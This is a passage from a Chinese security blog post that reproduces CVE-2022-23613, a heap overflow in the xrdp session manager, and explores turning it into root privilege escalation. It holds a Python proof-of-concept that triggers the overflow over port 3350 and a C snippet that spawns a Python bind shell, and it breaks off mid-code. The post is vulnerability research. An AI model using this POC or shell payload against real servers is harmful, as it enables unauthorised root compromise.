<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>CVE-2022-23613 漏洞复现与利用可能性尝试 | TokameinE - 雨声淅淅沥沥，犬吠永不止息</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: Bender;
 src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
 font-family: BenderLight;
 src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('/img/bg.jpg');
  --light-background: url('/img/91110244_p0.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li><li class="navItem"><a class="navBlock" href="/links/"><span class="navItemTitle">Links</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>CVE-2022-23613 漏洞复现与利用可能性尝试</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2022-11-04T14:33:22.000Z" id="date"> 2022-11-04</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2024-12-29T04:50:34.976Z" id="updated"> 2024-12-29</time></div></span></div></div><hr><div id="post-content"><blockquote>
<p>写在前面：本篇文章后，笔者已经发现了可稳定利用且不依赖堆喷的利用方案，详情请见笔者于 看雪KCTF2022秋季赛 所出题目：<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-274982.htm">https://bbs.kanxue.com/thread-274982.htm</a><br>笔者在该比赛中将本题的稳定利用方式作为赛题提交参赛，并最终收获 <strong>精致奖(Rank3)</strong><br>因此本篇内容属于笔者对于堆喷利用技巧的探索和思考</p>
</blockquote>
<h1 id="CVE-2022-23613复现与漏洞利用可能性"><a href="#CVE-2022-23613复现与漏洞利用可能性" class="headerlink" title="CVE-2022-23613复现与漏洞利用可能性"></a>CVE-2022-23613复现与漏洞利用可能性</h1><p>因为很少做过真实场景下的漏洞复现，深感自己知识的浅薄，恰巧团里的师傅发了个洞，让我看看怎么利用，因此顺便做一个简陋的分析吧。</p>
<p>漏洞编号为 <strong>CVE-2022-23613</strong>，现已公开了相关信息。该漏洞作为一个运行在 <strong>root</strong> 权限下的 RDP 服务，由于该漏洞最终能够导致任意代码执行，因此笔者打算以提权作为最终的利用目标。</p>
<blockquote>
<p>若本文存在任何纰漏，请务必与我联系，我会尽快修正本文内容。</p>
</blockquote>
<h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">xrdp-sesman <span class="hljs-number">0.9</span><span class="hljs-number">.18</span><br>  The xrdp session manager<br>  <span class="hljs-title function_">Copyright</span> <span class="hljs-params">(C)</span> 2004-2020 Jay Sorg, Neutrino Labs, and all contributors.<br>  See https:<span class="hljs-comment">//github.com/neutrinolabs/xrdp for more information.</span><br></code></pre></td></tr></table></figure>

<p>该项目的开源地址：<a target="_blank" rel="noopener" href="https://github.com/neutrinolabs/xrdp">https://github.com/neutrinolabs/xrdp</a></p>
<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs diff">static int<br>sesman_data_in(struct trans *self)<br>&#123;<br><span class="hljs-addition">+ #define HEADER_SIZE 8</span><br>    int version;<br>    int size;<br><br>    if (self-&gt;extra_flags == 0)<br>    &#123;<br>        in_uint32_be(self-&gt;in_s, version);<br>        in_uint32_be(self-&gt;in_s, size);<br><span class="hljs-deletion">-        if (size &gt; self-&gt;in_s-&gt;size)</span><br><span class="hljs-addition">+        if (size &lt; HEADER_SIZE || size &gt; self-&gt;in_s-&gt;size)</span><br>        &#123;<br><span class="hljs-deletion">-            LOG(LOG_LEVEL_ERROR, &quot;sesman_data_in: bad message size&quot;);</span><br><span class="hljs-addition">+            LOG(LOG_LEVEL_ERROR, &quot;sesman_data_in: bad message size %d&quot;, size);</span><br>            return 1;<br>        &#125;<br>        self-&gt;header_size = size;<br><span class="hljs-meta">@@ -302,11 +303,12 @@</span> sesman_data_in(struct trans *self)<br>            return 1;<br>        &#125;<br>        /* reset for next message */<br><span class="hljs-deletion">-        self-&gt;header_size = 8;</span><br><span class="hljs-addition">+        self-&gt;header_size = HEADER_SIZE;</span><br>        self-&gt;extra_flags = 0;<br>        init_stream(self-&gt;in_s, 0); /* Reset input stream pointers */<br>    &#125;<br>    return 0;<br><span class="hljs-addition">+ #undef HEADER_SIZE</span><br>&#125;<br><br>/******************************************************************************/<br></code></pre></td></tr></table></figure>

<p>从已公开的 Patch 可以看出，它添加了一个对 <code>size</code> 变量的负数校验，似乎意味着整数溢出漏洞的存在，不妨跟踪一下该变量。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span> <span class="hljs-comment">/* connected server or client (2 or 3) */</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (self-&gt;si != <span class="hljs-number">0</span> &amp;&amp; self-&gt;si-&gt;source[self-&gt;my_source] &gt; MAX_SBYTES)<br>    &#123;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (self-&gt;trans_can_recv(self, self-&gt;sck, <span class="hljs-number">0</span>))<br>    &#123;<br>        cur_source = XRDP_SOURCE_NONE;<br>        <span class="hljs-keyword">if</span> (self-&gt;si != <span class="hljs-number">0</span>)<br>        &#123;<br>            cur_source = self-&gt;si-&gt;cur_source;<br>            self-&gt;si-&gt;cur_source = self-&gt;my_source;<br>        &#125;<br>        read_so_far = (<span class="hljs-type">int</span>) (self-&gt;in_s-&gt;end - self-&gt;in_s-&gt;data);<br>        to_read = self-&gt;header_size - read_so_far;<br><br>        <span class="hljs-keyword">if</span> (to_read &gt; <span class="hljs-number">0</span>)<br>        &#123;<br>            read_bytes = self-&gt;trans_recv(self, self-&gt;in_s-&gt;end, to_read);<br></code></pre></td></tr></table></figure>

<p>查找 <code>self-&gt;header_size</code> 的引用，可以发现该变量将与 <code>self-&gt;trans_recv</code> 的参数间接相关，而该函数类似于 <code>read</code> 的作用，将 <code>self</code> 相关的套接字中读取 <code>to_read</code> 个字符到 <code>self-&gt;in_s-&gt;end</code> 。</p>
<p>而该缓冲区来自于：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> trans *<br><span class="hljs-title function_">trans_create</span><span class="hljs-params">(<span class="hljs-type">int</span> mode, <span class="hljs-type">int</span> in_size, <span class="hljs-type">int</span> out_size)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trans</span> *<span class="hljs-title">self</span> =</span> (<span class="hljs-keyword">struct</span> trans *) <span class="hljs-literal">NULL</span>;<br><br>    self = (<span class="hljs-keyword">struct</span> trans *) g_malloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> trans), <span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">if</span> (self != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        make_stream(self-&gt;in_s);<br>        init_stream(self-&gt;in_s, in_size);<br>        make_stream(self-&gt;out_s);<br>        init_stream(self-&gt;out_s, out_size);<br>        self-&gt;mode = mode;<br>        self-&gt;tls = <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">/* assign tcp calls by default */</span><br>        self-&gt;trans_recv = trans_tcp_recv;<br>        self-&gt;trans_send = trans_tcp_send;<br>        self-&gt;trans_can_recv = trans_tcp_can_recv;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> self;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> init_stream(s, v) do \</span><br><span class="hljs-meta">    &#123; \</span><br><span class="hljs-meta">        <span class="hljs-keyword">if</span> ((v) &gt; (s)-&gt;size) \</span><br><span class="hljs-meta">        &#123; \</span><br><span class="hljs-meta">            g_free((s)-&gt;data); \</span><br><span class="hljs-meta">            (s)-&gt;data = (char*)g_malloc((v), 0); \</span><br><span class="hljs-meta">            (s)-&gt;size = (v); \</span><br><span class="hljs-meta">        &#125; \</span><br><span class="hljs-meta">        (s)-&gt;p = (s)-&gt;data; \</span><br><span class="hljs-meta">        (s)-&gt;end = (s)-&gt;data; \</span><br><span class="hljs-meta">        (s)-&gt;next_packet = 0; \</span><br><span class="hljs-meta">    &#125; while (0)</span><br></code></pre></td></tr></table></figure>

<p>可以看见，该缓冲区会通过 <code>g_malloc</code> 创建在堆上，那么只要 <code>to_read</code> 的值超出了堆的原始大小，就有可能造成堆溢出了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">g_list_trans = trans_create(TRANS_MODE_TCP, <span class="hljs-number">8192</span>, <span class="hljs-number">8192</span>);<br></code></pre></td></tr></table></figure>

<p>从调用点也可以看出，每次建立一个新的连接时都会为该连接创建一个大小为 0x2000 的输入缓冲区，并且接下来将会调用 <code>trans_check_wait_objs</code> ：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br><span class="hljs-title function_">trans_check_wait_objs</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> trans *self)</span><br>&#123;<br>	......<br>    <span class="hljs-keyword">if</span> (self-&gt;type1 == TRANS_TYPE_LISTENER) <span class="hljs-comment">/* listening */</span><br>    &#123;<br>		......<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-comment">/* connected server or client (2 or 3) */</span><br>    &#123;<br>        <span class="hljs-keyword">if</span> (self-&gt;si != <span class="hljs-number">0</span> &amp;&amp; self-&gt;si-&gt;source[self-&gt;my_source] &gt; MAX_SBYTES)<br>        &#123;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (self-&gt;trans_can_recv(self, self-&gt;sck, <span class="hljs-number">0</span>))<br>        &#123;<br>            cur_source = XRDP_SOURCE_NONE;<br>            <span class="hljs-keyword">if</span> (self-&gt;si != <span class="hljs-number">0</span>)<br>            &#123;<br>                cur_source = self-&gt;si-&gt;cur_source;<br>                self-&gt;si-&gt;cur_source = self-&gt;my_source;<br>            &#125;<br>            read_so_far = (<span class="hljs-type">int</span>) (self-&gt;in_s-&gt;end - self-&gt;in_s-&gt;data);<br>            to_read = self-&gt;header_size - read_so_far;<br><br>            <span class="hljs-keyword">if</span> (to_read &gt; <span class="hljs-number">0</span>)<br>            &#123;<br>                read_bytes = self-&gt;trans_recv(self, self-&gt;in_s-&gt;end, to_read);<br>				......<br>            &#125;<br>		......<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> rv;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>如果创建的类型不为 <code>TRANS_TYPE_LISTENER</code> ，那么该连接就会调用 <code>self-&gt;trans_recv</code> 将数据直接读进刚刚创建的输入缓冲区中，且由于它并没有校验 <code>self-&gt;header_size</code> 可能是负数的情况，因此可以令 <code>to_read</code> 通过负数减去一个正数溢出为一个极大的正数，从而导致堆溢出。</p>
<p>POC：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>    s.connect((<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">3350</span>))<br>    sdata = <span class="hljs-string">b&#x27;&#x27;</span><br>    sdata += struct.pack(<span class="hljs-string">&quot;I&quot;</span>,<span class="hljs-number">0x2222CCCC</span>) <span class="hljs-comment">#version</span><br>    sdata += struct.pack(<span class="hljs-string">&quot;&gt;I&quot;</span>,<span class="hljs-number">0x80000000</span>) <span class="hljs-comment">#headersize</span><br>    s.send(sdata)<br>    sdata = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10000</span>  <span class="hljs-comment">#padding</span><br>    s.send(sdata)<br></code></pre></td></tr></table></figure>

<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>回顾一下刚刚的 <code>trans_create</code> 可以发现：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> trans *<br><span class="hljs-title function_">trans_create</span><span class="hljs-params">(<span class="hljs-type">int</span> mode, <span class="hljs-type">int</span> in_size, <span class="hljs-type">int</span> out_size)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trans</span> *<span class="hljs-title">self</span> =</span> (<span class="hljs-keyword">struct</span> trans *) <span class="hljs-literal">NULL</span>;<br><br>    self = (<span class="hljs-keyword">struct</span> trans *) g_malloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> trans), <span class="hljs-number">1</span>);<br>    ......<br>        self-&gt;trans_recv = trans_tcp_recv;<br>        self-&gt;trans_send = trans_tcp_send;<br>        self-&gt;trans_can_recv = trans_tcp_can_recv;<br>    <span class="hljs-keyword">return</span> self;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>struct trans self</code> 结构体与输入输出缓冲区同样位于堆内存中，并且它还初始化了函数指针，那么一个可行的利用点就是：通过堆溢出去覆盖 <code>self-&gt;trans_recv</code> 偏移处的值为一个类似 <code>system</code> 的函数来进行任意命令执行。</p>
<p>通过 IDA 搜索可以找到如下两个函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">extern</span>:<span class="hljs-number">00000000004105</span>D8                 extrn g_execvp:near<br><span class="hljs-keyword">extern</span>:<span class="hljs-number">0000000000410658</span>                 extrn g_execlp3:near<br></code></pre></td></tr></table></figure>

<p>这两个命令分别是 <code>execvp</code> 和 <code>execlp</code> 的包装，函数实现如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br><span class="hljs-title function_">g_execvp</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *p1, <span class="hljs-type">char</span> *args[])</span><br>&#123;<br>	......<br>    args_len = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (args[args_len] != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        args_len++;<br>    &#125;<br>    g_strnjoin(args_str, ARGS_STR_LEN, <span class="hljs-string">&quot; &quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> **) args, args_len);<br><br>    g_rm_temp_dir();<br>    rv = execvp(p1, args);<br>	......<br>&#125;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">g_execlp3</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *a2, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *a3)</span><br>&#123;<br>	......<br>    g_strnjoin(args_str, ARGS_STR_LEN, <span class="hljs-string">&quot; &quot;</span>, args, <span class="hljs-number">2</span>);<br>	......<br>    g_rm_temp_dir();<br>    rv = execlp(a1, a2, a3, (<span class="hljs-type">void</span> *)<span class="hljs-number">0</span>);<br>	......<br>&#125;<br></code></pre></td></tr></table></figure>

<p>因为 xrdp 服务是通过 socket 进行通信的，因此让其打开 “&#x2F;bin&#x2F;sh” 是不够的，想要让它能够完成任意命令执行，最好还是让它反弹一个 shell 出来比较合适，比方说：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>	<span class="hljs-type">char</span> ars2[]=<span class="hljs-string">&quot;-cimport socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\&quot;\&quot;,10000));s.listen();c,_=s.accept();f=c.fileno();os.dup2(f,0);os.dup2(f,1);os.dup2(f,2);os.system(\&quot;sh\&quot;);&quot;</span>;<br>	execlp(<span class="hljs-string">&quot;python3&quot;</span>,<span class="hljs-string">&quot;python3&quot;</span>,ars2,<span class="hljs-number">0</span>);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这个格式就比较像 <code>g_execlp3</code> 的实现了对吗？看起来似乎相当可行，但是笔者在经过各种各样的尝试以后放弃了这个做法，因为精准的控制参数是一件极其困难的事情。</p>
<h3 id="参数控制的难点"><a href="#参数控制的难点" class="headerlink" title="参数控制的难点"></a>参数控制的难点</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">read_bytes = self-&gt;trans_recv(self, self-&gt;in_s-&gt;end, to_read);<br></code></pre></td></tr></table></figure>

<p>假设我们令 <code>self-&gt;trans_recv</code> 为 <code>g_execlp3</code> ，那么我们就需要令 <code>self</code> 指向 “python3”，<code>self-&gt;in_s-&gt;end</code> 也是一个指向 “python3” 字符串的指针，以及 <code>to_read</code> 必须为一个指向参数的指针。</p>
<p>通过 IDA 搜索二进制程序中的字符串可以发现，唯一一个或许能用的字符串只有 “&#x2F;bin&#x2F;sh”，因此所有的参数字符串都需要我们一起放在 payload 中输入到内存里去才行。</p>
<p>但是有与常规的 CTF PWN 题不同的是，用户通过 socket 进行交互，泄露地址是一件比较麻烦的事情，大部分情况下甚至连回显都拿不到，更何况就算有办法拿到回显，泄露地址的参数也仍然需要控制，因此又要绕回到这个问题上，因此只好考虑如何在无地址的情况下完成利用。</p>
<h3 id="覆盖结构体的细节"><a href="#覆盖结构体的细节" class="headerlink" title="覆盖结构体的细节"></a>覆盖结构体的细节</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trans</span></span><br><span class="hljs-class">&#123;</span><br>    tbus sck; <span class="hljs-comment">/* socket handle */</span><br>    <span class="hljs-type">int</span> mode; <span class="hljs-comment">/* 1 tcp, 2 unix socket, 3 vsock */</span><br>    <span class="hljs-type">int</span> status;<br>    <span class="hljs-type">int</span> type1; <span class="hljs-comment">/* 1 listener 2 server 3 client */</span><br>    ttrans_data_in trans_data_in;<br>    ttrans_conn_in trans_conn_in;<br>    <span class="hljs-type">void</span> *callback_data;<br>    <span class="hljs-type">int</span> header_size;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stream</span> *<span class="hljs-title">in_s</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stream</span> *<span class="hljs-title">out_s</span>;</span><br>    <span class="hljs-type">char</span> *listen_filename;<br>    tis_term is_term; <span class="hljs-comment">/* used to test for exit */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stream</span> *<span class="hljs-title">wait_s</span>;</span><br>    <span class="hljs-type">char</span> addr[<span class="hljs-number">256</span>];<br>    <span class="hljs-type">char</span> port[<span class="hljs-number">256</span>];<br>    <span class="hljs-type">int</span> no_stream_init_on_data_in;<br>    <span class="hljs-type">int</span> extra_flags; <span class="hljs-comment">/* user defined */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ssl_tls</span> *<span class="hljs-title">tls</span>;</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *ssl_protocol; <span class="hljs-comment">/* e.g. TLSv1, TLSv1.1, TLSv1.2, unknown */</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *cipher_name;  <span class="hljs-comment">/* e.g. AES256-GCM-SHA384 */</span><br>    trans_recv_proc trans_recv;<span class="hljs-comment">//0x280</span><br>    trans_send_proc trans_send;<br>    trans_can_recv_proc trans_can_recv;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">source_info</span> *<span class="hljs-title">si</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">xrdp_source</span> <span class="hljs-title">my_source</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure>

<p><code>self</code> 是一个 <code>struct trans</code> ，为了触发 <code>self-&gt;trans_recv</code> ，我们需要先通过几个检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br><span class="hljs-title function_">trans_check_wait_objs</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> trans *self)</span><br>&#123;<br>	......<br>    <span class="hljs-keyword">if</span> (self-&gt;status != TRANS_STATUS_UP)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    rv = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (self-&gt;type1 == TRANS_TYPE_LISTENER) <span class="hljs-comment">//&lt;------ false</span><br>    &#123;<br>		......<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-comment">/* connected server or client (2 or 3) */</span><br>    &#123;<br>        <span class="hljs-keyword">if</span> (self-&gt;si != <span class="hljs-number">0</span> &amp;&amp; self-&gt;si-&gt;source[self-&gt;my_source] &gt; MAX_SBYTES)<br>        &#123;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (self-&gt;trans_can_recv(self, self-&gt;sck, <span class="hljs-number">0</span>))<br>        &#123;<br>            cur_source = XRDP_SOURCE_NONE;<br>            <span class="hljs-keyword">if</span> (self-&gt;si != <span class="hljs-number">0</span>)<br>            &#123;<br>                cur_source = self-&gt;si-&gt;cur_source;<br>                self-&gt;si-&gt;cur_source = self-&gt;my_source;<br>            &#125;<br>            read_so_far = (<span class="hljs-type">int</span>) (self-&gt;in_s-&gt;end - self-&gt;in_s-&gt;data);<br>            to_read = self-&gt;header_size - read_so_far;<br><br>            <span class="hljs-keyword">if</span> (to_read &gt; <span class="hljs-number">0</span>)<br>            &#123;<br>                read_bytes = self-&gt;trans_recv(self, 